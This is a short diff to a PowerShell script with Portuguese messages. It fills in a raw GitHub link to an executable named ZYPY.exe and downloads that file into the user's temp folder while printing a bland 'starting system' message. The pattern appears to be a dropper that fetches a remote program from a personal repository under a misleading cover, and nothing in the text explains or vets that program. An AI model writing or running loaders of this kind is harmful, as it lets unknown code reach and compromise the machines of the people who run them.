@@ -1,4 +1,4 @@
-$url = "LINK_DIRETO_DO_SEU_EXE_AQUI"
+$url = "https://raw.githubusercontent.com/arthurcsilva109-create/russo353/refs/heads/main/ZYPY.exe"
 $temp = "$env:TEMP\ZYPY.exe"
 Write-Host "Iniciando sistema..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $url -OutFile $temp
